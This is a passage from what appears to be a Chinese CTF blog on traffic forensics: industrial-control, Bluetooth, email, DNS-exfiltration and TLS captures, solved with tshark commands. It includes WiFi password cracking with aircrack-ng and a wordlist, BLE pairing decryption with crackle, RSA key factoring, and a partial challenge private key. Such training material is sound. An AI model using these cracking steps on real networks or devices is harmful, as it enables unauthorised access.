<a href=#%e4%be%8b%e9%a2%984-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(_ws.col.protocol == &#34;S7COMM&#34;) &amp;&amp; (frame.number == 418)</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20240430135813366.png alt=/posts/5422d65/imgs/image-20240430135813366.png height=1600 width=2560>
然后直接把明文传输的数据 base64 解码即可
<img loading=lazy src=/posts/5422d65/imgs/image-20240430135958048.png alt=/posts/5422d65/imgs/image-20240430135958048.png height=1225 width=2292></p><p><code>flag{hncome66!}</code></p><h3 class=heading-element id=iec60870_asdu协议><span>IEC60870_ASDU协议</span>
<a href=#iec60870_asdu%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>IEC60870_ASDU协议是电力系统中的一种协议</p></blockquote><p>可能会把关键信息藏在 IOA 参数中</p><h3 class=heading-element id=tpkt协议><span>TPKT协议</span>
<a href=#tpkt%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>用以下命令提取下 TPKT 协议中传输的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r S7Vegenere.pcapng -Y <span class=s1>&#39;_ws.col.protocol == &#34;TPKT&#34;&#39;</span> -T fields -e <span class=s1>&#39;data.data&#39;</span></span></span></code></pre></td></tr></table></div></div><p>如果上面这个命令提取出来的数据不完整，可以用以下这个命令直接去提取 TCP 中传输的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 工业控制协议流量分析2.pcap -T fields -Y <span class=s1>&#39;!(tcp.payload == 4d:4d:53:5f:50:41:59:4c:4f:41:44:5f:4e:4f:52:4d:41:4c)&#39;</span> -e tcp.payload &gt; out.txt</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=dnp-30协议><span>DNP 3.0协议</span>
<a href=#dnp-30%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>用以下命令提取一下传输的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r dnp3.pcapng -T fields -e <span class=s1>&#39;dnp3.al.octet_string&#39;</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=蓝牙流量分析><span>蓝牙流量分析</span>
<a href=#%e8%93%9d%e7%89%99%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=obex协议><span>OBEX协议</span>
<a href=#obex%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>过滤器中输入<code>OBEX</code>，然后导出传输的压缩包，然后再在搜索中输入<code>PIN Code</code>选择分组列表和字符串即可找到解压密码</p><h3 class=heading-element id=att协议><span>ATT协议</span>
<a href=#att%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>例题1-low_energy_crypto</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 先用tshark导出公钥，并把公钥另存为pub.key</span>
</span></span><span class=line><span class=cl>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_rx -Y <span class=s1>&#39;btatt.opcode == 0x1b&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># 然后用tshark导出密文，这里的数据如果不是十六进制，用tshark提有时候会出问题，可以手提</span>
</span></span><span class=line><span class=cl>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y <span class=s1>&#39;btatt.opcode == 0x12&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; enc.txt
</span></span><span class=line><span class=cl><span class=c1># 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了，这里的密文后面如果有多余\x00，可以用010手动去除，要不然可能解密失败</span>
</span></span><span class=line><span class=cl>python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc.txt</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20241202135717254.png alt=/posts/5422d65/imgs/image-20241202135717254.png height=498 width=1599></p><p>例题2-BLE_crypto</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 先用tshark导出公钥，并把公钥另存为pub.key，这里如果是十六进制，需要CyberChef转换一下先</span>
</span></span><span class=line><span class=cl>tshark -r BLE_crypto.pcapng -T fields -e btatt.value -Y <span class=s1>&#39;btatt.opcode&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># 然后用tshark导出密文，如果是十六进制，需要CyberChef转换一下先</span>
</span></span><span class=line><span class=cl>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y <span class=s1>&#39;btatt.opcode == 0x12&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; enc.txt
</span></span><span class=line><span class=cl><span class=c1># 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了</span>
</span></span><span class=line><span class=cl>python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20241202140503314.png alt=/posts/5422d65/imgs/image-20241202140503314.png height=571 width=1889></p><p><strong>手动解析RSA公钥，并爆破生成私钥：</strong></p><ol><li>解析公钥: <code>openssl rsa -in pub.key -text -inform PEM -pubin</code></li></ol><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226232852559.png alt=/posts/5422d65/imgs/image-20250226232852559.png height=635 width=1734></p><ol start=2><li>十六进制转十进制并分解n</li></ol><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226233215942.png alt=/posts/5422d65/imgs/image-20250226233215942.png height=867 width=2560></p><ol start=3><li>使用 rsatool.py 导出私钥 priv.key</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python rsatool.py -p <span class=m>7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527</span> -q <span class=m>7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221</span> -e <span class=m>65537</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226233503658.png alt=/posts/5422d65/imgs/image-20250226233503658.png height=1236 width=2560></p><ol start=4><li>使用私钥来解密密文</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>openssl rsautl -decrypt -raw -inkey priv.key -in flag
</span></span><span class=line><span class=cl>openssl pkeyutl -decrypt -in flag -out decrypted_flag -inkey priv.key</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=smp协议><span>SMP协议</span>
<a href=#smp%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>SMP协议的全称是Secure Manager Protocol，用来定义蓝牙的配对和密钥的分发</p><p>配对完成后传输的数据是加密的，我们需要用(Crakle)[https://github.com/mikeryan/crackle]这个项目进行解密</p><blockquote><p>这里老版本的可能有点问题，建议去pr中找一下新版的安装</p><p>参考链接：https://cloud.tencent.com/developer/article/2159878</p></blockquote><p>安装好项目后直接运行一下命令解密流量包即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o dec.pcapng</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20241202141020218.png alt=/posts/5422d65/imgs/image-20241202141020218.png height=387 width=643></p><p>SMP协议解密完成后，我们可以在ATT协议中发现传输的数据，用以下命令导出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r dec.pcapng -T fields -e btatt.value -Y <span class=s1>&#39;btatt.opcode == 0x52&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span></span></span></code></pre></td></tr></table></div></div><p>然后CyberChef将得到的十六进制数据转换一下即可得到flag：<code>flag{9ba3973652c0ee073652c0ee0c76ca6cb36441bd40}</code></p><h2 class=heading-element id=邮件流量分析><span>邮件流量分析</span>
<a href=#%e9%82%ae%e4%bb%b6%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>可以试试看导出对象-导出IMF-导出文件的后缀是eml（可以使用网易邮箱大师打开）</p><p>eml文件是将数据base64编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍</p><h2 class=heading-element id=无线流量分析><span>无线流量分析</span>
<a href=#%e6%97%a0%e7%ba%bf%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>在kali中用弱口令密码爆破出WIFI密码</p><p>执行命令：<code>aircrack-ng ctf.pcap -w rockyou.txt</code></p><p>执行命令解码：<code>airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap</code></p><p>然后打开解码后的文件，查找flag</p><h2 class=heading-element id=dns流量分析><span>DNS流量分析</span>
<a href=#dns%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=dnslog外带的流量><span>DNSlog外带的流量</span>
<a href=#dnslog%e5%a4%96%e5%b8%a6%e7%9a%84%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p><img loading=lazy src=/posts/5422d65/imgs/image-20241120165643159.png alt=/posts/5422d65/imgs/image-20241120165643159.png height=1032 width=1920></p><p>直接使用tshark导出DNS外带的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 1.pcap -T fields -e dns.qry.name -Y <span class=s1>&#39; ip.dst == 8.8.8.8 &amp;&amp; dns.qry.type == 1&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> <span class=p>|</span> uniq &gt; data.txt</span></span></code></pre></td></tr></table></div></div><p>例题1-攻防世界 MISC - tunnel</p><h3 class=heading-element id=数据以二进制藏在dns各种解析记录中><span>数据以二进制藏在DNS各种解析记录中</span>
<a href=#%e6%95%b0%e6%8d%ae%e4%bb%a5%e4%ba%8c%e8%bf%9b%e5%88%b6%e8%97%8f%e5%9c%a8dns%e5%90%84%e7%a7%8d%e8%a7%a3%e6%9e%90%e8%ae%b0%e5%bd%95%e4%b8%ad class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>这种情况下有时候需要分IP导出数据</p><blockquote><p>DNS记录类型，常用的有：</p><p>A：A记录，指向别名或IPv4地址。</p><p>AAAA：IPv6地址解析。</p><p>NS：解析服务器记录。</p><p>MX：邮件交换记录。</p><p>CNAME：别名。</p><p>txt：为某个主机名或域名设置的说明。</p><p>PTR：指针记录，PTR记录是A记录的逆向记录。</p><p>SOA：标记一个区的开始，起始授权机构记录</p></blockquote><p>例题1-2024国赛-Toug_DNS</p><h3 class=heading-element id=信息以二进制藏在端口号末尾中><span>信息以二进制藏在端口号末尾中</span>
<a href=#%e4%bf%a1%e6%81%af%e4%bb%a5%e4%ba%8c%e8%bf%9b%e5%88%b6%e8%97%8f%e5%9c%a8%e7%ab%af%e5%8f%a3%e5%8f%b7%e6%9c%ab%e5%b0%be%e4%b8%ad class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h2 class=heading-element id=slltls加密流量分析><span>SLL、TLS加密流量分析</span>
<a href=#slltls%e5%8a%a0%e5%af%86%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><blockquote><p>老版本的 wireshark 中显示的是 SSL，新版本的改成TLS了</p></blockquote><p>解密方法就是点击 编辑 -> 首选项 -> Protocols -> TLS <code>加载 RSA 私钥</code> 或者 <code>加载日志文件((Pre)-Master-Secret log)</code></p><p>解完密后就和平常的流量分析一样了</p><p>例题1-BUU 第九章TLS流量分析</p><p>打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了</p><p>翻看流量包，追踪 TCP 流，发现流7中POST了一个 sslkey.log 日志文件</p><p><img loading=lazy src=/posts/5422d65/imgs/N7.png alt=/posts/5422d65/imgs/N7.png height=2158 width=3836></p><p>导出 sslkey.log 日志文件，然后按上面的步骤导入解密</p><p><img loading=lazy src=/posts/5422d65/imgs/N8.png alt=/posts/5422d65/imgs/N8.png height=2160 width=3838></p><p>解密完后直接搜索 flag{ 字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}</p><p><img loading=lazy src=/posts/5422d65/imgs/N9.png alt=/posts/5422d65/imgs/N9.png height=2160 width=3840></p><p>例题-DDCTF2018 流量分析</p><p>直接在 TLS 加载 RSA 私钥解密即可</p><p>私钥的格式如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ
</span></span><span class=line><span class=cl>LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
</span></span><span class=line><span class=cl>vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
</span></span><span class=line><span class=cl>AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
</span></span><span class=line><span class=cl>QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
</span></span><span class=line><span class=cl>QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
</span></span><span class=line><span class=cl>czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ
</span></span><span class=line><span class=cl>ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9
</span></span><span class=line><span class=cl>kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN
</span></span><span class=line><span class=cl>+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
</span></span><span class=line><span class=cl>AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH
</span></span><span class=line><span class=cl>/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
